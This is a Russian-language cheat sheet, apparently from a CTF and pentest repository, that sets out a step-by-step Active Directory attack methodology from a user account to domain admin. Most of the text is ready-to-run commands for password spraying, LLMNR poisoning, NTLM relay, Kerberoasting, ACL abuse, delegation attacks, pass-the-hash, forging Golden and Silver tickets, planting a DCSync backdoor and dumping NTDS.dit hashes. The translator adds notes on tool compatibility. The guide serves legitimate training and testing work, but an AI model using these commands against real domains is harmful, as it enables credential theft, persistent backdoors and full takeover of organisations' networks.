<a id="-active-directory-attack-methodology"></a>
# 🏢 Методология атак на Active Directory

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 Английский оригинал](../README.md) • [🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md) • [🏠 Русская главная](../../README.ru.md)

```
    █████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
   ███████║██║  ██║   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
   ██╔══██║██║  ██║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
   ██║  ██║██████╔╝   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═╝  ╚═╝╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         Пошаговый путь от пользователя к администратору домена
```

<p align="center">
  <img src="https://img.shields.io/badge/AD-Methodology-red?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/CTF-Guide-blue?style=for-the-badge" alt="CTF">
  <img src="https://img.shields.io/badge/Domain_Admin-green?style=for-the-badge" alt="DA">
</p>

---

<a id="-attack-path-overview"></a>
## 🗺️ Обзор пути атаки

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     МЕТОДИКА АТАК НА AD                                  │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   ЭТАП 1: Сбор данных      ЭТАП 2: Начал. доступ      ЭТАП 3: Привил.  │
│   ├── Поиск в сети         ├── Password Spray         ├── Kerberoast   │
│   ├── Сбор LDAP            ├── Подм. LLMNR            ├── AS-REP       │
│   ├── Учётки               └── NTLM Relay             └── Права ACL    │
│   └── BloodHound                                                        │
│                                                                         │
│   ЭТАП 4: Перемещение      ЭТАП 5: Закрепление       ЭТАП 6: Домен     │
│   ├── Pass-the-Hash        ├── Golden Ticket         ├── DCSync        │
│   ├── WinRM/PSExec         ├── Silver Ticket         ├── NTDS.dit      │
│   └── WMI Exec             └── Skeleton Key          └── Захвачен!     │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

<a id="-table-of-contents"></a>
## 📋 Содержание

1. [Этап 1: сбор сведений](#-phase-1-enumeration)
2. [Этап 2: первоначальный доступ](#-phase-2-initial-access)
3. [Этап 3: повышение привилегий](#-phase-3-privilege-escalation)
4. [Этап 4: перемещение между узлами](#-phase-4-lateral-movement)
5. [Этап 5: закрепление доступа](#-phase-5-persistence)
6. [Этап 6: полный контроль над доменом](#-phase-6-domain-dominance)
7. [Краткий справочник команд](#-quick-command-reference)

---

<a id="-phase-1-enumeration"></a>
## 🔍 Этап 1: сбор сведений

<a id="11-network-discovery"></a>
### 1.1 Обнаружение узлов сети

```bash
# Поиск контроллеров домена
nmap -p 53,88,389,636,445 10.10.10.0/24

# Определение служб AD
nmap -p 88,135,139,389,445,464,636,3268,3269 -sV 10.10.10.10
```

**Основные порты:**
| Порт | Служба | Назначение |
|------|---------|---------|
| 53 | DNS | Разрешение доменных имён |
| 88 | Kerberos | Аутентификация |
| 389 | LDAP | Служба каталогов |
| 445 | SMB | Общие файловые ресурсы |
| 636 | LDAPS | Защищённый LDAP |
| 5985 | WinRM | Удалённое управление |

<a id="12-anonymous-enumeration-no-creds"></a>
### 1.2 Анонимный сбор сведений (без учётных данных)

```bash
# Нулевая сессия RPC
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# Анонимное подключение LDAP
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"

# Enum4linux
enum4linux -a 10.10.10.10

# Поиск пользователей через Kerbrute (без учётных данных!)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```

<a id="13-with-valid-credentials"></a>
### 1.3 С действительными учётными данными

> **Версии инструментов:** команды CrackMapExec сохранены из оригинала. Развитие открытого проекта продолжено под именем [NetExec](https://github.com/Pennyw0rth/NetExec); имена исполняемых файлов и параметры зависят от установленной версии.

```bash
# Получение сведений о домене
crackmapexec smb 10.10.10.10 -u user -p password --users
crackmapexec smb 10.10.10.10 -u user -p password --groups
crackmapexec smb 10.10.10.10 -u user -p password --shares

# Сбор сведений через LDAP
ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10
```

<a id="14-powerview-enumeration"></a>
### 1.4 Сбор сведений с PowerView

```powershell
# Импорт PowerView
Import-Module .\PowerView.ps1

# Сведения о домене
Get-Domain
Get-DomainController

# Поиск интересующих объектов
Get-DomainUser -SPN                    # Подходит для Kerberoasting
Get-DomainUser -PreauthNotRequired      # Подходит для AS-REP roasting
Get-DomainComputer -Unconstrained       # Делегирование

# Поиск сеансов администраторов домена (DA)
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

<a id="15-bloodhound-collection"></a>
### 1.5 Сбор данных для BloodHound

> **Совместимость:** `bloodhound-python` относится к Legacy BloodHound; для CE существует отдельная ветка и формат коллектора. Версии сборщика и сервера должны соответствовать друг другу. См. [BloodHound.py](https://github.com/dirkjanm/BloodHound.py). В блоке Cypher ниже сохранены строки с `#`, но это пояснения оригинала, а не допустимые комментарии Cypher: язык использует `//` или `/* … */`. См. [руководство Neo4j](https://neo4j.com/docs/cypher-manual/current/syntax/comments/). Последний запрос объединяет типы связей через OR и не доказывает наличие полного набора прав DCSync: для него требуются совместно **GetChanges** и **GetChangesAll**. См. [описание DCSync](https://bloodhound.specterops.io/resources/edges/dc-sync).

```bash
# Из Linux (bloodhound-python)
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All

# Из Windows (SharpHound)
.\SharpHound.exe -c All
```

**Запросы BloodHound:**
```cypher
# Кратчайший путь к администратору домена (DA)
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Пользователи, подходящие для Kerberoasting
MATCH (u:User {hasspn:true}) RETURN u.name

# Пользователи с правами DCSync
MATCH (u:User)-[:DCSync|:GetChanges|:GetChangesAll]->(d:Domain) RETURN u.name
```

---

<a id="-phase-2-initial-access"></a>
## 🔑 Этап 2: первоначальный доступ

<a id="21-password-spraying"></a>
### 2.1 Password spraying — один пароль для нескольких учётных записей

```bash
# Password spraying через CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

# Password spraying через Kerbrute
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'
```

**Распространённые пароли:**
```
Season+Year: Summer2024!, Winter2024
CompanyName+123: Company123!
Welcome1, Password1
```

<a id="22-llmnrnbt-ns-poisoning"></a>
### 2.2 Подмена ответов LLMNR/NBT-NS

```bash
# Терминал 1: запуск Responder
sudo responder -I eth0 -wPv

# Ожидание хешей...
# NTLMv2 перехвачен!

# Терминал 2: подбор пароля по хешу
hashcat -m 5600 hash.txt rockyou.txt
```

<a id="23-ntlm-relay"></a>
### 2.3 Перенаправление аутентификации NTLM (NTLM relay)

> **Уточнение:** комментарий «SMB выключен» не означает, что показанная команда сама отключает SMB-сервер Responder: его состояние задаётся конфигурацией. Требования NTLM relay зависят от протокола и защит целевого сервиса; отсутствие обязательной подписи SMB не является универсальным условием успеха. См. [Responder](https://github.com/lgandx/Responder) и [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py).

```bash
# Поиск узлов без обязательной подписи SMB
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Responder (SMB выключен)
sudo responder -I eth0

# Атака с перенаправлением аутентификации
impacket-ntlmrelayx -tf relay.txt -smb2support
```

<a id="24-as-rep-roasting-no-password-required"></a>
### 2.4 AS-REP roasting (пароль не требуется!)

> **Уточнение примеров:** AS-REP roasting без пароля применим к учётным записям с отключённой предварительной аутентификацией Kerberos. Команды ниже не сохраняют результат в `asrep.txt` автоматически; аналогично в разделе Kerberoasting не создаётся `kerberoast.txt`, а Rubeus указывает другое имя `hashes.txt`. Это разрывы последовательности в оригинале; команды сохранены. См. исходники [GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) и [GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py).

```bash
# Поиск уязвимых учётных записей
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Или с учётными данными
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Подбор пароля
hashcat -m 18200 asrep.txt rockyou.txt
```

---

<a id="-phase-3-privilege-escalation"></a>
## ⬆️ Этап 3: повышение привилегий

<a id="31-kerberoasting"></a>
### 3.1 Kerberoasting — подбор пароля по сервисному билету

```bash
# Из Linux
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Из Windows
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Подбор пароля
hashcat -m 13100 kerberoast.txt rockyou.txt
```

<a id="32-acl-abuse"></a>
### 3.2 Злоупотребление правами ACL

**GenericAll для пользователя (полный контроль):**
```powershell
# Изменение пароля
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

**GenericAll для группы (полный контроль):**
```powershell
# Добавление своей учётной записи в группу
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

**GenericWrite (изменение свойств):**
```powershell
# Назначение SPN для Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='any/thing'}
```

**WriteDACL (изменение списка прав):**
```powershell
# Предоставление своей учётной записи прав DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

<a id="33-delegation-attacks"></a>
### 3.3 Атаки на делегирование

> **Уточнение:** примеры делегирования требуют соответствующих прав и настроек; обычной учётной записи недостаточно для произвольного изменения RBCD. В `rbcd.py` указываются действительные `sAMAccountName`, у компьютерных учётных записей они обычно оканчиваются на `$`; сокращённые имена `FAKE01` и `TARGET` сохранены из оригинала. Имя сохраняемого `getST.py` файла зависит от версии и может включать сервис и realm, поэтому `administrator.ccache` не универсально. См. [rbcd.py](https://github.com/fortra/impacket/blob/master/examples/rbcd.py) и [getST.py](https://github.com/fortra/impacket/blob/master/examples/getST.py).

**Unconstrained Delegation (неограниченное делегирование):**
```powershell
# Поиск целевых объектов
Get-DomainComputer -Unconstrained

# Отслеживание появления TGT
.\Rubeus.exe monitor /interval:5 /targetuser:DC$

# Инициирование (PrinterBug)
SpoolSample.exe DC01 YOURHOST
```

**Constrained Delegation (ограниченное делегирование):**
```bash
# Запрос билета
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/serviceaccount:password -dc-ip 10.10.10.10

# Использование билета
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

**Resource-Based Constrained Delegation (RBCD, ограниченное делегирование на основе ресурса):**
```bash
# Создание учётной записи компьютера
addcomputer.py -computer-name FAKE01 -computer-pass 'Password123!' domain.local/user:password

# Настройка RBCD
rbcd.py -delegate-from FAKE01 -delegate-to TARGET -action write domain.local/user:password

# Получение билета
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE01:'Password123!'
```

---

<a id="-phase-4-lateral-movement"></a>
## ➡️ Этап 4: перемещение между узлами

<a id="41-pass-the-hash"></a>
### 4.1 Pass-the-Hash — аутентификация с использованием хеша

```bash
# PSExec с хешем
impacket-psexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# WMIExec
impacket-wmiexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# SMBExec
impacket-smbexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# CrackMapExec
crackmapexec smb 10.10.10.10 -u admin -H NTLMHASH -x "whoami"
```

<a id="42-pass-the-ticket"></a>
### 4.2 Pass-the-Ticket — аутентификация с использованием билета

> **Форматы билетов:** `Rubeus dump` выводит билеты в формате KRB-CRED (`.kirbi`, в том числе Base64); это не готовый Linux-файл `ticket.ccache`. Переименование не преобразует формат. Сценарий оригинала опускает этот переход. См. [Rubeus](https://github.com/GhostPack/Rubeus#ticket-management) и [реализацию ccache в Impacket](https://github.com/fortra/impacket/blob/master/impacket/krb5/ccache.py).

```bash
# Экспорт билета
.\Rubeus.exe dump

# Использование билета (Linux)
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/admin@target

# Использование билета (Windows)
.\Rubeus.exe ptt /ticket:base64ticket
```

<a id="43-winrm"></a>
### 4.3 WinRM

```bash
# Evil-WinRM с паролем
evil-winrm -i 10.10.10.10 -u admin -p password

# С хешем
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH
```

<a id="44-overpass-the-hash"></a>
### 4.4 Overpass-the-Hash — получение билета по хешу

```bash
# Получение TGT с помощью хеша
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Дальнейшее использование Kerberos
dir \\server\share
```

---

<a id="-phase-5-persistence"></a>
## 🔒 Этап 5: закрепление доступа

<a id="51-golden-ticket"></a>
### 5.1 Golden Ticket — поддельный TGT

```bash
# Необходимы: NTLM-хеш krbtgt + SID домена

# Создание билета
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator

# Использование
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

```powershell
# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

<a id="52-silver-ticket"></a>
### 5.2 Silver Ticket — поддельный сервисный билет

```bash
# Создание сервисного билета
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
```

<a id="53-dcsync-backdoor"></a>
### 5.3 Бэкдор через права DCSync

```powershell
# Предоставление любому пользователю прав DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdooruser -Rights DCSync
```

---

<a id="-phase-6-domain-dominance"></a>
## 👑 Этап 6: полный контроль над доменом

<a id="61-dcsync"></a>
### 6.1 DCSync

```bash
# Извлечение всех хешей
impacket-secretsdump domain.local/admin:password@10.10.10.10

# С хешем
impacket-secretsdump -hashes :NTLMHASH domain.local/admin@10.10.10.10

# Конкретный пользователь
impacket-secretsdump domain.local/admin:password@10.10.10.10 -just-dc-user administrator
```

<a id="62-ntdsdit-extraction"></a>
### 6.2 Извлечение NTDS.dit

```bash
# Создание теневой копии
vssadmin create shadow /for=C:

# Копирование NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# Извлечение в автономном режиме
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

<a id="63-crackmapexec-dump"></a>
### 6.3 Извлечение данных с CrackMapExec

```bash
# Извлечение NTDS через DCSync
crackmapexec smb DC01 -u admin -p password --ntds
```

---

<a id="-quick-command-reference"></a>
## 📊 Краткий справочник команд

<a id="enumeration-one-liners"></a>
### Однострочные команды сбора сведений

```bash
# Поиск контроллеров домена (DC)
nmap -p 88,389 --open 10.10.10.0/24

# Поиск пользователей (без учётных данных)
kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/wordlists/names.txt

# Поиск учётных записей для AS-REP roasting
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# Kerberoast
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
```

<a id="attack-cheatsheet"></a>
### Справочник атак

| Атака | Команда |
|--------|---------|
| Password spraying | `crackmapexec smb DC -u users.txt -p 'Pass123!'` |
| AS-REP Roast | `GetNPUsers.py domain.local/ -usersfile u.txt -dc-ip DC` |
| Kerberoast | `GetUserSPNs.py domain.local/u:p -dc-ip DC -request` |
| DCSync | `secretsdump.py domain.local/admin:pass@DC` |
| Pass-the-Hash | `psexec.py -hashes :HASH domain.local/admin@target` |
| Golden Ticket | `ticketer.py -nthash KRBTGT -domain-sid SID -domain domain.local admin` |

<a id="hash-cracking"></a>
### Подбор паролей по хешам

> **Типы хешей:** `13100` и `18200` здесь относятся соответственно к TGS-REP и AS-REP с **etype 23 (RC4-HMAC)**, а не ко всем вариантам Kerberos. Захваченный NetNTLMv2 (`5600`) отличается от NT-хеша (`1000`), используемого в примерах Pass-the-Hash. См. [официальные примеры Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes).

| Тип хеша | Режим Hashcat |
|-----------|--------------|
| NTLM | `-m 1000` |
| NTLMv2 | `-m 5600` |
| Kerberoast | `-m 13100` |
| AS-REP | `-m 18200` |

---

<a id="-ctf-tips"></a>
## 🎯 Советы для CTF

1. **Сначала собирайте сведения** — не проводите атаки вслепую
2. **Проверяйте AS-REP** — можно получить материал для подбора без учётных данных!
3. **Используйте BloodHound** — ищите пути атаки
4. **Проверяйте ACL** — в них часто встречаются ошибки настройки
5. **Проверяйте делегирование** — оно может дать простой путь к цели
6. **Осторожно применяйте password spraying** — возможна блокировка учётных записей!
7. **Сохраняйте все учётные данные** — они пригодятся на следующих этапах

---

<a id="-related-cheatsheets"></a>
## 📚 Связанные шпаргалки

- [BloodHound](../../BloodHound/translations/README.ru.md)
- [Impacket](../../Impacket/translations/README.ru.md)
- [CrackMapExec](../../CrackMapExec/README.md)
- [Rubeus](../../Rubeus/README.md)
- [PowerView](../../PowerView/README.md)
- [Responder](../../Responder/README.md)
- [Evil-WinRM](../../Evil-WinRM/README.md)
- [Mimikatz](../../Mimikatz/translations/README.ru.md)

---

<p align="center">
  <b>🏢 От пользователя до администратора домена!</b><br>
  <i>Следуйте методологии и получайте контроль над доменом</i>
</p>
